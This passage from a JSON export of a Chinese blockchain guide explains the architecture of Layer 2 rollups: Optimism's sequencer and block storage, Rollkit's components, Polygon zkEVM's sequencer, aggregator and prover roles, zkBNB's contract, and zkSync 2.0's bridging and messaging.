来开始他们的 L2 旅程。一旦他们有 ETH 来支付费用，他们就会开始在 L2 上发送交易。下图演示了这种交互以及使用的所有关键 Optimistic Ethereum 组件：\n\n提现\n与存款一样重要的是，用户可以从汇总中退出是至关重要的。提款由 L2 上的正常交易发起，但在争议期结束后使用 L1 上的交易完成。\n\nsequencer\n块生产者，目前只支持单个sequencer。\n\n接受用户链下交易（公开eth_sendRawTransaction、验证费用……）\n观察链上交易（主要是来自 L1 的存款事件），由DTL扫描存储\n将两种交易合并到具有特定顺序的 L2 块中。\n将两个东西作为调用数据提交给 L1，将合并的 L2 块传播到 L1：\n\n用户在L2发送的pending链下交易\n关于链上事务的排序的足够信息，以从步骤3成功地重建块\n\n\nsequencer还提供早在步骤 3 中访问块数据的权限，以便用户可以选择在 L1 确认之前访问实时状态\n\n验证者\n\n向用户提供rollup数据\n验证rollup完整性并争论无效断言\n\n\n\n区块存储\n所有 Optimism 区块都存储在以太坊上一个特殊的智能合约中，称为CanonicalTransactionChain 。Optimism 块保存在 CTC 内的一个列表中，这个列表形成了 Optimism 区块链，此列表只能添加。\n包括CanonicalTransactionChain保证现有区块列表不能被新的以太坊交易修改的代码。然而，如果以太坊区块链本身被重组并且过去以太坊交易的顺序发生变化，这种保证可能会被打破。Optimism 主网被配置为能够抵抗多达 50 个以太坊区块的区块重组。如果以太坊经历了比这更大的重组，Optimism 也会重组。optimism可以借助以太坊尽可能不进行重大重组的目标来获得一定的安全属性，从而抵御大型的区块重组。\n区块产生\nOptimism 区块生产主要由sequencer的单一方管理，它可以提供以下服务：\n\n交易确认和状态更新\n构造和执行L2块\n向L1提交用户交易\n\nsequencer会按照收到的顺序立即接受或拒绝并检查用户发送的交易是否有效。然后将交易作为待处理块应用于其本地状态。这些pending区块会定期大批量提交给以太坊（L1）进行最终确定。此批处理过程通过将固定成本分摊到给定批次中的所有交易来显着降低总体交易费用。sequencer还应用了一些基本的压缩技术来最小化发布到以太坊的数据量。\n区块执行\nOptimism 节点直接从合约CanonicalTransactionChain中保存的区块列表中下载区块。\nOptimism 节点由两个主要组件组成，即以太坊数据索引器和 Optimism 客户端软件。以太坊数据索引器，也称为“数据传输层” （或 DTL），从发布到CanonicalTransactionChain合约的区块中重建Optimism区块链。DTL搜索由CanonicalTransactionChain发出的事件，该事件表示已发布新的Optimism块。然后，它检查发出这些事件的事务，以标准以太坊块格式重建已发布的块。\nOptimism 节点的第二部分，即 Optimism 客户端软件。基于Geth，EVM、账户状态结构、gas计量机制和fee和以太坊一致，此为EVM等效，所以很多以太坊工具可以和Optimism一起使用。\nOptimism 客户端软件持续监控新索引块的 DTL。当一个新块被索引时，客户端软件将下载它并执行其中包含的交易。在 Optimism 上执行交易的过程与在以太坊上相同：我们加载 Optimism 状态，针对该状态应用交易，然后记录由此产生s的状态变化。然后对 DTL 索引的每个新块重复此过程。\n参考\n[1] : optimism protocol\n[2] : evm Equivalence\n[3] : spec\n[4] : 降低layer2DA存储成本"},"blockchainguide/Layer2_Solutions/layer2/rollkit/rollkit":{"slug":"blockchainguide/Layer2_Solutions/layer2/rollkit/rollkit","filePath":"blockchainguide/Layer2_Solutions/layer2/rollkit/rollkit.md","title":"rollkit","links":[],"tags":[],"content":"优势\n\n共享DA层安全性\n可扩展性：rollkit部署在专门的DA层，如celestia,且有自己的专用计算资源\n可定制：自定义DA或者执行环境\n主权：可以部署主权rollup\n支持ABCI兼容的状态机，以及自定义的执行环境，包括EVM兼容\n\n如何根据cosmos SDk构建主权rollup\n\n使用cosmos sdk 创建与rollkit兼容的rollup链\n使用现有的基于cosmos sdk构建的APP链，将其部署rollkit 汇总\n\n构建结算层\n结算层非常适合那些希望避免部署主权汇总的开发人员。它们为汇总提供了一个平台，以验证证据并解决争议。此外，它们还充当了汇总的中心，以促进共享同一结算层的汇总之间的最小化信任的代币转移和流动性共享。将结算层视为一种特殊类型的执行层。目前流行celestia或者restaking（eginelayer）或者 polygon aval\n主要组件\nRoll-up sequencer节点从用户那里收集事务，将它们聚合成块，并将块发布到数据可用性（DA）层（如Celestia）上以进行排序和最终确定。完整节点执行和验证汇总块，在乐观汇总的情况下，在需要时传播欺诈证据。轻型客户端将接收标头，验证证据（欺诈、zk等），并验证有关状态的信任最小化查询。\n![image-20230403133035905](/Users/carver/Library/Application Support/typora-user-images/image-20230403133035905.png)\n改造\n您想将Cosmos SDK应用程序更改为Rollkit汇总吗？没问题！您需要将Cosmos SDK Go依赖项替换为启用了Rollkit的版本，该版本可以在Rollkit/Cosmos SDK存储库中找到。\n请注意，rollkit/cosmos sdk存储库遵循上游cosmos sdk的发布分支，但额外的好处是使用rollkit而不是Tendermint作为ABCI客户端。\n别忘了用rollkit/tendermin替换另一个依赖项tendermin，它有一个增强的ABCI接口，包括州欺诈证明所需的方法。\n数据可用性层\n可以使用通用接口访问数据可用性（DA）。这种设计允许与任何DA层无缝集成。新的实现可以通过编程方式插入，而不需要派生Rollkit。\nDataAvailabilityLayerClient接口包括基本的生命周期方法（Init、Start、Stop）以及数据可用性方法（SubmitBlock、CheckBlockAvailability）。\nBlockRetriever接口用于从数据可用性层同步完整节点。重要的是要记住，DA层块高度和汇总高度之间没有直接相关性。每个DA层块可以包含任意数量的汇总块。\ncelestia\nCelestia是为Rollkit实现的数据可用性集成的一个示例。它通过celestiaorg/go-cnc软件包使用Celestia Node网关API。要在Celestia上部署Rollkit汇总，您还必须运行Celestia轻节点\n节点组件\n内存池\n内存池的灵感来源于Tendermint内存池。默认情况下，事务是以先到先得（FCFS）的方式处理的。交易的排序可以在应用程序级别上实现；目前，这可以通过在CheckTx上返回优先级来实现，一旦我们支持ABCI++，也可以通过PrepareProposal和应用程序内存池来实现。\n块管理器\n块管理器包含通过Go通道进行通信的Go协程AggregationLoop、RetrieveLoop和SyncLoop。这些Go例程在Rollkit节点启动（OnStart）时运行。只有sequencer节点运行AggregationLoop，它根据BlockManager中的BlockTime控制块生产的频率，以便使用计时器进行汇总。\n所有节点都运行SyncLoop，它会查找以下操作：\n\n\n接收块标头：通过通道HeaderInCh接收块标头，Rollkit节点尝试用相应的块数据验证块。\n\n\n接收块数据：通过通道blockInCh接收块体，Rollkit节点尝试验证块。\n\n\n接收状态欺诈证明：状态欺诈证明是通过通道接收的FraudProofInCh和Rollkit节点试图验证它们。请注意，我们计划对完整节点进行配置，因为完整节点本身也会产生状态欺诈证明。\n\n\n根据BlockManager中的DABlockTime，具有计时器的信号RetrieveLoop。\n\n\n所有节点还运行RetrieveLoop，它负责与数据可用性层交互。它检查最后更新的DAHeight以检索具有SyncLoop发出的计时器DABlockTime的块。请注意，用于汇总的DA层的起始高度DAStartHeight在BlockManager中是可配置的。\n节点类型\n完整节点验证所有块，并为乐观汇总生成欺诈证据。由于他们完全验证了所有汇总块，因此他们不依赖于欺诈或有效性证明来确保安全。\n轻节点（正在进行的工作）\n轻型节点是对块头进行身份验证的轻型汇总节点，可以通过欺诈证明或有效性证明进行保护。建议低资源设备上的普通用户使用。运行轻型节点的用户可以对汇总的状态进行信任最小化查询。目前，Rollkit灯光节点仍在开发中。\n序列器节点\n汇总可以使用序列器节点。序列器是汇总的块生产者，负责将事务聚合为块，通常执行事务以生成状态根，供汇总的轻型客户端使用。\nRollkit计划支持多种不同的可插拔sequencer方案：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nDeploy in one-clickFaster soft-confirmations than L1Control over rollup’s transaction orderingAtomic composability with other rollupsCensorship resistanceImplementation StatusCentralized sequencerRequires spinning up a sequencerYes ✅Yes ✅No ❌Eventual ⏳*✅ Implemented!Decentralized sequencerRequires spinning up a sequencer setYes ✅Yes ✅No ❌Real-time ⚡️PlannedShared decentralized sequencerYes ✅Yes ✅No ❌Yes ✅Real-time ⚡️PlannedPure fork-choice ruleYes ✅No ❌Maybe 🟡Maybe 🟡Eventual ⏳Planned\n状态有效性模式\n悲观（仅完整节点）\n悲观的汇总是一个汇总，仅支持完整的节点，该节点重新汇总汇总中的所有交易以检查其有效性。Rollkit默认情况下支持悲观的汇总。\n悲观的汇总类似于Tether如何将比特币用作通过Omnilayer用作数据可用性层。\n乐观（欺诈证明）（正在进行的工作）\nRollkit的当前设计由一个单序器组成，该测序器将张贴到DA层的单个序列和多个（可选）完整节点。音序器八卦块标题到完整节点，完整节点从DA层中获取块。然后，完整的节点在这些块中执行交易以更新其状态，然后在P2P网络上进行八卦块标题以进行Rollkit Light节点。\n一旦启用了国家欺诈证明，当一个块包含欺诈状态过渡时，Rollkit Full节点可以通过在交易之间比较中间状态根（ISR）来检测到它，并生成可以在P2P网络上闲聊的状态欺诈证明节点。然后，这些Rollkit Light节点可以使用此状态欺诈证据来验证欺诈性状态过渡是否自行发生。\n总体而言，只要系统中至少有一个诚实的完整节点将产生州欺诈证明，则州欺诈证明将在完整节点和轻节点之间实现信任最小化。\n请注意，Rollkit州欺诈证明仍在进行中，并且需要在ABCI之上的新方法，特别是生成违法，验证违法和Getapphash。\n您可以找到当前的详细设计以及将州欺诈证明推向此架构决策记录（ADR）中所需的剩余工作。\n计划进行有效性（ZK）汇总，但Rollkit目前不支持。\n交易流程\n交易流程\n汇总用户使用轻型节点与汇总P2P网络通信，主要原因有两个：\n\n\n提交交易\n\n\n八卦标题和欺诈证明\n\n\n![image-20230403135148279](/Users/carver/Library/Application Support/typora-user-images/image-20230403135148279.png)\n为了进行交易，用户向他们的轻节点提交一个交易，轻节点将交易传给一个完整的节点。在将事务添加到其内存池之前，完整节点会检查其有效性。有效的事务被包括在内存池中，而无效的事务被拒绝，并且用户的事务将不会被处理。\n如果事务是有效的并且已经包含在内存池中，那么定序器可以将其添加到汇总块中，然后将其提交到数据可用性（DA）层。这将为用户带来成功的事务流，并相应地更新汇总的状态。\n在块被提交到DA层之后，完整的节点下载并验证块。然而，有一种可能性是，定序器可能会恶意地将具有无效事务或状态的块提交给DA层。在这种情况下，汇总链的完整节点将认为该块无效。在乐观汇总的情况下，如果他们发现块无效，他们会生成欺诈证据，并在P2P网络中与其他完整节点和轻型节点进行八卦。\n因此，上链将停止，网络将决定通过社会共识来分叉。未来，当去中心化测序仪方案到位时，将提供额外的选项，例如削减测序仪或选择另一个完整节点作为测序仪。但是，在任何情况下，都必须创建一个新的块并将其提交给DA层。您可以在这里阅读更多关于测序仪节点的信息。"},"blockchainguide/Layer2_Solutions/layer2/zkroullup/polygon-zkevm":{"slug":"blockchainguide/Layer2_Solutions/layer2/zkroullup/polygon-zkevm","filePath":"blockchainguide/Layer2_Solutions/layer2/zkroullup/polygon-zkevm.md","title":"polygon-zkevm","links":[],"tags":[],"content":"wiki.polygon.technology/docs/home/polygon-basics/zkEVM-basics/\n![image-20221118162953707](/Users/carver/Library/Application Support/typora-user-images/image-20221118162953707.png)\nzk node 的运行者可以当聚合器或者排序器\nSequencer：\n收集事务并成批发布它们\n从公布的交易中收取费用\n支付 L1交易费 + MATIC (取决于未完成的批次)\nMATIC 到聚合器\n有利可图，如果: txs 费用 &gt; L1 调用 + MATIC网络支付的 fee\nAggregator\n处理Sequencers发布的事务\n构建zkProof\n从Sequencer接收MATIC\n静态成本：L1 合约调用成本+服务成本（用于构造证明）\n盈利条件：MATIC支付的fee&gt;L1 合约调用成本+服务成本（用于构造证明）\nZK provider\nzkEVM采用先进的零知识技术来创建有效性证明。它使用了一个零知识证明器（zkProver），该证明器旨在在任何服务器上运行，并且经过设计与大多数消费者硬件兼容。每个聚合者将使用此zkProver验证批次并提供有效性证明。\n它由一个主状态机执行器、一组辅助状态机（每个都有自己的执行器）、一个STARK证明生成器和一个SNARK证明生成器组成。\n![image-20221121110155723](/Users/carver/Library/Application Support/typora-user-images/image-20221121110155723.png)\n\nLX-LY bridge\nLX-LY桥是一个智能合约，允许用户在LX和LY两层之间转移资产。zkEVM中的L1-L2是安全存款和提取资产的分散桥梁。它是两个智能合约的组合，一个部署在一个链上，另一个部署到另一个链。\nzkEVM中的L1和L2合约是相同的，除了每个合约的部署位置。桥L1合约位于以太坊主网上，用于管理rollup之间的资产转移，而桥L2合约位于特定rollup上，负责主网和rollup（或汇总）之间的资产传输。\n第2层互操作性允许本地机制在不同的L2网络之间迁移资产。此解决方案嵌入到网桥智能合约中。\nverifyer\n验证者是一个智能合同，它能够验证任何 ZK-SNARK 加密证明。该 SNARK 验证器证明了批处理中每个事务的有效性。它是任何 zk-Rollup 体系结构中的关键实体，主要原因是它验证了确保有效状态转换的 Proof 的正确性\n交易生命周期\n在使用 L2进入事务流之前，用户需要一些资金来执行任何 L2事务。为此，用户需要通过 zkEVM 桥 dApp 将一些以太从 L1传输到 L2。\n桥：\n\n质押以太\n等待直到在L2上发布globalExitRoot\n对 L2进行索赔并收到资金\n\nL2 交易：\n\n用户在钱包中初始化 tx (例如 Metamask)并将其发送给一个序列器（Sequencer）\n一旦Sequencer提交添加其事务，它将在L2上完成\n事务已经在 L2上完成，但在 L1上没有完成(简单地说，L2状态还没有在 L1上完成)。也被称为信任状态\n顺序器将批处理数据发送到 L1智能契约，使任何节点都能以不可信的方式从 L1进行同步(又名虚拟状态)\n聚合器将对待定交易进行验证，并构建证明，以实现L1的最终性\n一旦证明被验证，用户的事务将达到 L1最终结果(对取款很重要) ，这被称为统一状态。\n\n效率是网络性能的关键。zkEVM应用了几种实现策略来保证效率。以下列出了其中一些：\n\n第一个策略是部署 PoE，它激励最有效的聚合器参与证明生成过程\n第二个策略是执行所有的脱链计算，同时只保留必要的数据和 zk 证明在链上。\n桥接智能契约的实现方式，例如仅使用 Exit Tree Roots 以 UTXO 方式结算帐户。\n在zkProver中使用专门的加密原语，以加快计算速度并最小化证明大小，如所示：\n\n运行一种特殊的零知识汇编语言(zkASM)来解释字节码\n使用诸如 zk-STARK 之类的零知识工具进行证明; 这些证明虽然规模较大，但速度非常快。\n一个 zk-SNARK 被用来证明 zk-STARK 证明的正确性，而不是发布大量的 zk-STARK 证明作为有效性证明。这些 zk-SNARK 反过来作为状态变化的有效性证据发布。这有助于将天然气成本从5M 降低到350K。\n\n\n\nPOE\n效率证明（PoE）模型利用了现有的PoD机制，并支持多个协调员无权限参与，以在L2层中生成批次。这些批次是从第1层的汇总事务中创建的。PoE采用了一种更简单的技术，由于其在解决PoD中所涉及的挑战方面具有更高的效率，因此备受青睐。\n\n维护其无许可功能以生产L2批次\n高效，这是整个网络性能的关键标准\n达到可接受的权力下放程度\n免受恶意攻击，尤其是验证程序的攻击\n在整体验证工作和网络价值之间保持一个公平的平衡\n\n链上数据可用性：\n完整ZK汇总模式需要发布链上的数据（用户需要重建完整状态）和有效性证明（零知识证明）。然而，考虑到以太坊配置，在链上发布数据会导致天然气价格上涨，这是第1层的问题。这使得在完整ZK汇总配置和混合配置之间做出决定具有挑战性。\n在混合模式下，可以执行以下任一操作：\n有效性：数据存储在链外，只有有效性证明在链上发布。\nVolition：对于某些交易，数据和有效性证明都保持在链上，而对于其余的交易，只有证明继续链上。\n除非证明模块能够高度加速以降低验证器的成本，否则混合模式仍然可行。\nPOE合约\nzkEVM中的底层协议通过使用有效性证明来确保状态转换正确。为了确保已遵循一组预先确定的规则来允许状态转换，采用了效率证明智能合约。效率证明（PoE）智能合约目前部署在Goerli测试网上（goerli.etherscan.io/address/0x14cB06e8dE2222912138F9a062E5a4d9F4821409）\n智能合约验证有效性证明，以确保每个转换都正确完成。这是通过使用zk-SNARK电路实现的。这种类型的系统需要两个过程：事务批处理和事务验证。\n为了执行这些过程，zkEVM使用了两种参与者：序列器和聚合器。在此两层模型下：\n序列器→ 向网络提出事务批处理，即它们成批汇总事务请求并将其添加到PoE智能合约中。\n聚合器→ 检查交易批次的有效性并提供有效性证明。任何无权限聚合器都可以提交证明，以证明状态转换计算的正确性。\n因此，PoE智能合约发出两个调用：一个调用从序列器接收批，另一个调用聚合器，请求验证批。\n因此，PoE智能合约发出两个调用：一个调用从序列器接收批，另一个调用聚合器，请求验证批。\n![image-20221121142228438](/Users/carver/Library/Application Support/typora-user-images/image-20221121142228438.png)\nPoE智能合约对序列器和聚合器提出了以下要求：\n任何拥有运行zkEVM节点所需软件的人都可以是Sequencer。\n每个Sequencer必须以MATIC代币的形式支付费用，以获得创建和提议批次的权利。\n提出有效批次（由有效交易组成）的排序器，由交易请求者或网络用户支付的费用激励。\n排序器：\n任何拥有运行zkEVM节点所需软件的人都可以是Sequencer。\n每个Sequencer必须以MATIC代币的形式支付费用，以获得创建和提议批次的权利。\n提出有效批次（由有效交易组成）的排序器，由交易请求者或网络用户支付的费用激励。\n聚合器：\n聚合器从序列器接收所有事务信息，并将其发送给证明器，证明器在复杂的多项式计算后提供一个小的zk证明。智能合约验证了这一证明。这样，聚合器收集数据，将其发送给证明器，接收其输出，最后将信息发送给智能合约，以检查证明器的有效性证明是否正确。\n聚合器的任务是为Sequencers提出的L2事务提供有效性证明。\n除了运行zkEVM的zkNode软件外，聚合器还需要有专门的硬件来使用zkProver创建零知识有效性证明。\n对于给定批次，提交有效性证明的聚合者首先获得MATIC费用（由该批次的排序者支付）。\n聚合者需要表明其验证交易的意图。之后，他们根据自己的策略竞争产生有效性证明。\nzkNode\nzkNode是运行zkEVM节点所需的软件。网络需要客户端来实现同步并管理参与者（序列器或聚合器）的角色。Polygon zkEVM参与者将选择参与方式：\n作为了解网络状态的节点，或\n作为批量生产过程的参与者，担任两个角色中的任何一个：序列者或聚合者, zkNode体系结构本质上是模块化的。\n![image-20221121143109745](/Users/carver/Library/Application Support/typora-user-images/image-20221121143109745.png)\n\n排序器\nSequencer从用户接收L2事务，将其作为新的L2批处理，然后将该批作为有效的L2事务提交给PoE智能合约。Sequencer从用户处接收交易，并将从所有已发布的交易中收取所有费用。因此，为了从中获得最大利润，从经济上激励测序者发布有效交易。通常使用带有排序算法的交易池来选择最有利可图的交易来解决这一问题\n发布一系列交易时，Sequencer必须支付MATIC代币费用。此金额将根据需要验证的待定批次而变化。如果序列器通过发布无效事务或仅使用一个事务创建批处理来显示恶意行为，则该协议将确保断开链的代价非常高昂。这确保发布无效事务将导致序列器丢失。\n序列器可以是受信任的或无权限的：\nt rusted:\n为了实现快速的最终结果，在网络中增加了可信序列。在 L1上实现虚拟化之前，受信任的序列程序可以预测状态的样子。\n无许可的：\n为了改进Polygon zkEVM的去中心化，我们允许无权限序列器在网络上运行。任何具有所需硬件设置的人都可以初始化自己的zkNode，并作为独立的、抗审查的、无权限的定序器参与网络。\n聚合器：\n聚合器从序列器接收所有事务信息，并将其发送给验证器（或zkProver），后者在复杂的多项式计算后提供字节大小的zk证明。智能合约验证了这一证明。通过这种方式，聚合器收集数据，将其发送到验证器，接收其输出，最后将信息发送到智能合约，以验证验证器的有效性证明是否正确。\n定序器支付的MATIC费用将支付给聚合器。如果链上的批量过多，MATIC成本将增加，这将更好地激励聚合器生成可验证的证据。运行聚合器的总成本由两个因素计算：L1事务成本和服务器成本（待定）。\n同步器：\n除了排序和验证过程之外，zkNode还支持批处理及其有效性证明的同步，这只有在将这些批处理添加到L1之后才会发生。这是使用名为Synchronizer的子组件完成的。\n同步器负责从智能合约中获取所有数据，包括排序器发布的数据（事务）和聚合器发布的信息（有效性证明）。所有这些数据都存储在一个巨大的数据库中，并通过名为JSON-RPC的服务提供给第三方。\n同步器负责从以太坊区块链读取事件，包括新的批次，以保持状态完全同步。从这些事件中读取的信息必须存储在数据库中。同步器还处理可能的重组，这将通过检查最后一个ethBlockNum和最后一个ethBlockHash是否同步来检测。\nRPC：\nRPC (远程过程调用)是一个与以太网兼容的 JSON-RPC 接口。对于一个软件应用程序与以太链交互(通过读取区块链数据和/或向网络发送事务) ，它必须连接到一个以太节点。RPC 支持将 zkEVM 与现有工具集成，如 Metamask、 ethercan 和 Infura。它将事务添加到 Pool，并使用只读方法与 State 进行交互。\nstate：\n此子组件实现Merkle树并连接到DB后端。它检查区块级别的完整性（与天然气和区块大小等相关的信息）和一些与交易相关的信息（签名、足够的余额）。它还将智能合约代码存储到Merkle树中，并使用EVM处理事务。\nz  provider:\n事务的所有有效规则都在 zkProver 中实现和执行。ZkProver 以多项式和汇编语言的形式执行复杂的数学计算。这些内容稍后将在智能合同上进行验证。\n这些规则可以看作是事务为了能够修改状态树或退出树而必须满足的约束。ZkProver 是最复杂的模块，需要开发两种新的编程语言来实现所需的元素。这里概述了它的详细体系结构。\nZKP ro vi de r\n多边形 zkEVM 完整性的核心是它的零知识证明器，又名 zkProver。\n本文档提供了 zkProver 的详细架构描述，而没有深入探究其技术复杂性。此外，它还简要地描述了它的状态机，这里有完整的文档说明。\ndocs.hermez.io/zkEVM/zkProver/State-Machines/Overview/zkProver-State-Machines/#introduction\n介绍"},"blockchainguide/Layer2_Solutions/layer2/zkroullup/zkbnb":{"slug":"blockchainguide/Layer2_Solutions/layer2/zkroullup/zkbnb","filePath":"blockchainguide/Layer2_Solutions/layer2/zkroullup/zkbnb.md","title":"zkbnb","links":[],"tags":[],"content":"![image-20221118125400482](/Users/carver/Library/Application Support/typora-user-images/image-20221118125400482.png)\n用户需要在bsc上的ERC20代币绑定到zkbnb 上，无法将代币在上面流通\n支持用户在Layer1和Layer2之间进行NFT和FT的传输\n用户将代币存储在BSC上的rollup合约上进入到ZKroullup,ZkBNB监视器将跟踪存款并将其作为第二层交易提交，一旦提交人验证了交易，用户就可以在其账户上获得资金，他们可以通过将交易发送给提交人进行处理来开始交易。\n用户可以通过向网络发送签名的交易来将任何数量的资金转移到ZKBNB上的任何帐户。\n用户启动提款交易，资金将在 ZkBNB 上烧毁。一旦对下一批中的事务进行了rolliup，相关数量的token将从rollup contract解锁到目标帐户。\n所有的买入/卖出报价、NFT/Collection的元数据、媒体资源、账户配置文件都存储在NFT市场的后端，只有竞争的Hash、所有权、creatorTreasuryRate和其他字段记录在ZkBNB上。为了鼓励价格发现，任何人都可以在市场上购买/出售报价，而无需支付任何费用，因为报价缓存在后端，而不是发送到ZkBNB。一旦报价匹配，由买入和卖出报价组成的AtomicMatch交易将发送给ZkBNB，以实现交易。用户还可以通过发送取消报价事务以禁用后端缓存的报价来手动取消报价\nZkBNB 上的每个帐户都有其简称，用户可以使用它来存储资金并接收任何加密货币、令牌或 NFT。\nZkBNB本机支持ECDSA签名并遵循EIP712签名结构，这意味着大多数以太坊钱包可以无缝支持ZkBNB。BSC用户没有额外的努力来利用ZkBNB。\n与大多数将状态树放入内存的汇总解决方案不同，BAS-SMT 是一种用于持久数据的版本化、快照表(不可变)稀疏树。BAS-SMT 是 ZkBNB 大规模应用的关键因素github.com/bnb-chain/zkbnb-smt/\nZkBNB Crypto是描述证明电路的库。一旦ZK汇总节点有了足够的事务，它就将它们聚合成一批，并为证明电路编译输入，以编译成一个简洁的ZK证明 github.com/bnb-chain/zkbnb-crypto\nZKbnb contract\n这是layer 2的入口和出口。\nzkBNB合约提供以下特性：\nL1安全：ZkBNBVerifier 协议可以验证 Layer2生成的 SNARK 证明(简洁的非交互式知识论证) ，从而证明汇总块中每个事务的有效性。所以 ZkBNB 和 BSC 共享同样的安全系统。由于 zkSNARK 的证明，安全性是由密码学保证的。用户不必信任任何第三方，也不必为了防止欺诈而不断监视 Rollup 块。\nL1到L2沟通：ZkBNB合同公开了几个支持BNB的接口，在BSC或ZkBNA上创建的BEP20/BEP721可以自由地流向ZkBNC。\nL2到L1的沟通：每个rollup L2块包括一批需要由 L1 合约处理的 L2操作\nBSC上的完全退出：如果用户认为自己的交易受到ZkBNB的审查，可以通过L1智能合约请求提取资金\n验证器将块从L2提交到L1，这些块将存储在L1上，以供以后验证。提交一个块包括以下步骤：\n\n必须是治理合约中的validator(怎么成为validator\n上一个块必须是存储在合约中的最新快\ncommitOneBlock\n\n校验number和timestamp\n检查链上操作\n\n交易类型RegisterZNS CreatePair UpdatePairRate Deposit DepositNft Withdraw WithdrawNft FullExit FullExitNft\n这些交易类型是定义在layer 2上的\n\n注册ZNS名称\n为 L2上的token swap创建token Pair\n令牌对的更新费率\n将代币从L1存入L2\n将NFT从L1存放到L2\n从 L2提取令牌到 L1，向 L2发送请求\n将 NFT 从 L2撤回到 L1，向 L2发送请求\n从L2向L1请求退出令牌，向L1发送请求\n请求从L2到L1退出NFT，向L1发送请求\n\n\n最终生成一个可执行的操作hash 和处理的优先级操作\n\n\n为验证证明创建区块承诺（只跟前一个区块和新区块有关，需要上个区块的state root ）\n最后返回这些验证信息（需要详细列出这些信息）\n\n\n\nCommitBlock包含块信息、事务数据和事务执行后的状态根。块信息包含时间戳、blockNumber和blockSize。二级事务打包在CommitBlockInfo.publicData中"},"blockchainguide/Layer2_Solutions/layer2/zkroullup/zkrollup资料":{"slug":"blockchainguide/Layer2_Solutions/layer2/zkroullup/zkrollup资料","filePath":"blockchainguide/Layer2_Solutions/layer2/zkroullup/zkrollup资料.md","title":"zkrollup资料","links":[],"tags":[],"content":"ipfs.io/ipfs/QmUHpp1nkFFeT3eodJHj9V9xWyhnwEpenxHAGYgB7Lzjgw"},"blockchainguide/Layer2_Solutions/layer2/zkroullup/zksync2.0":{"slug":"blockchainguide/Layer2_Solutions/layer2/zkroullup/zksync2.0","filePath":"blockchainguide/Layer2_Solutions/layer2/zkroullup/zksync2.0.md","title":"zksync2.0","links":[],"tags":[],"content":"介绍\nZksync 是 zkrollup, 使用加密有效性证明在以太坊上提供可扩展和低成本交易的无信任协议。\nzksync 概述\nRollup 需要 operator 将交易汇总在一起，计算出正确状态状态的零知识证明，再和 roullup 合约交互来影响状态转换。\nzksync 的 rollup 操作如下：\n\n用户创建交易或者优先级操作\n处理此请求后，Operator 创建 rollup 操作并将其添加到L2块中\n一旦L2区块完成，运营商区块证明作为区块承诺提交给 zksync 合约，合约将会校验 rollup的部分逻辑，验证成功则看做最终状态\n\nL2 区块的生命周期 ：\n\nPending :operator 接收到交易\nProcessed ：交易被 operator 执行并确认包含在下个区块中\nCommitted ：表明该区块的交易数据已发布在以太坊上。它不能证明它是以有效的方式执行的，但它确保了块数据的可用性。\nFinalized ：这表明交易的SNARK有效性证明已提交并由智能合约验证（一笔笔的交易由L1打包）。在这一步骤之后，交易被认为是最终的\n\n从 Processed 到 Finalized 要经历几个小时。\nzksync2.0 支持的功能如下：\n\nECDSA签名的本机支持：任何帐户都可以在 L2 中使用与 L1 相同的私钥进行管理\n支持 solidity 0.8.x\nWeb3 API与以太坊完全兼容。这允许与现有的索引器、浏览器等无缝集成。\n支持 keccak256、 sha256 和 ecrecover通过预编译\nhardhat 插件支持在 zksync 上简单测试和开发\n支持 从以太坊上传递数据到 zksync 上的合约\n\n了解zksync\n收费机制\n跨链桥\nL1和L2各部署一个合约，来作为桥接。开发人员可以自由为任何代币建造自己的桥梁。但是，我们提供默认的桥梁（一个用于ETH，另一个用于ERC20代币），可用于基本桥接。\n存钱到L2\n用户调用 L1 bradge合约的 存款方法，将会触发以下事件：\n\n用户在L1 上的token会被发送到 L1 bridge 并被锁住\nL1 bridge 合约会启动一笔交易发送到 L2 bridge 通过 L1→L2 (这是个什么)\n在L2交易中，token 将被 mint 并发送到L2上的指定地址\n\n如果zkSync上还不存在令牌，则会为其部署新的合约。假设L2令牌地址是确定性的（基于原始L1地址、名称和符号），不管谁是第一个桥接它的人，新的L2地址都是相同的。\n对于每个执行的L1→L2交易，都会有一条L2→L1日志消息确认其执行。\n\n\n\nwarning：\n如果此交易出于任何原因失败（例如，提供的费用太低），则日志消息将陈述其故障。在这种情况下，可以在L1桥上证明包含日志，以通过调用Moded sopairfailedDeposit将存入资金退还给原始发件人\n提款到L1\n用户调用取款操作在 L2 bradge 合约上，将会触发以下动作：\n\nL2的token会被burn掉\n一个 L2→L1 的消息关于提款的 会被发送\n之后，撤回操作将可由L1 bradge 中的任何人最终完成（通过证明包含L2→L1消息，这是在调用L1 网桥中的的finlizeWithdraw方法时完成的）\n调用方法后，资金从L1 bradge 解锁并发送给提款接收者\n\nwarning ：\n在测试网环境上，我们会自动确定所有提款，即，对于每次提款，我们将通过进行L1交易来照顾它，以证明每条消息包含在内。\nL1/L2互操作性\n优先级队列\nL2→L1 消息传递\n与 L1 → L2 通信相反，仅基于传输信息，而不是基于 L1 上的事务执行。它是一个内置功能，由两部分组成：从 L2 发送消息和在 L1 上读取消息。第一个是作为对 L2 系统智能合约的调用来实现的。第二个是在 zkSync L1 智能合约上作为 getter 函数实现的。\n发送消息：\n从 L2 发送到 L1 的每条消息都包含发送者的地址和消息本身。消息的长度可以任意大，但是消息越长，发送的成本就越高。操作员必须包括相应 merkle 根的所有消息（见下一段）。因此，所有消息都是公开可用的，不必依赖运营商来披露它们\n阅读消息\n发送的每条消息都可以在链上读取。此外，可以证明消息已在特定的 L2 块中发送。为了使这种证明对用户和运营商都尽可能便宜，我们将每个 L2 块的所有消息存储在 merkle 树中。因此，任何 L1 智能合约都可以通过提供包含在某个 L2 块中的证明来使用发送的消息。只能基于运营商发送给 zkSync L1 智能合约的数据生成证明。也可以通过API获得证明\n总结：\n\nL2 → L1 通信需要 L2 上的一个事务和 L1 上的一个事务。\n消息可以是任意长度。\n证明消息包含在 L2 块中所需的所有数据始终可以从以太坊恢复。但是，最简单的方法是通过 API 向运营商请求证明。\n\nL1→L2 交流\n交易有 base fee, 基于交易的ergslimit 和L1上的gas price 得出的，目前来说L1→ 